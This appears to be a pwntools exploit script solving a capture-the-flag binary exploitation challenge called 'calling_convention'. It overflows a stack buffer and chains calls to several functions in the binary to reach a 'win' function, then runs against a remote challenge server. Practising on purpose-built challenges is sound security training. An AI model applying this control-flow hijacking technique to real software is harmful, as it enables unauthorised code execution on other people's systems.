from pwn import *

context.clear(arch='amd64', terminal=['tmux', 'splitw', '-fh'])
elf = context.binary = ELF('./calling_convention')

gdbscript = '''b vuln
c
'''

#p = process('./calling_convention')
#p = gdb.debug('./calling_convention', gdbscript=gdbscript)

#p = remote('localhost', 1337)
p = remote('chal.bearcatctf.io', 39440)

win = elf.sym['win']
set_key1 = elf.sym['set_key1']
ah = elf.sym['ahhhhhhhh']
food = elf.sym['food']
number3 = elf.sym['number3']

print(p.recvuntil(b'> ').decode())

payload  = b''
payload += b'A' * 8
payload += b'B' * 8
payload += p64(number3)
payload += p64(set_key1)
payload += p64(ah)
payload += p64(food)
payload += p64(win)

p.sendline(payload)

print(p.recvall().decode())

p.interactive()
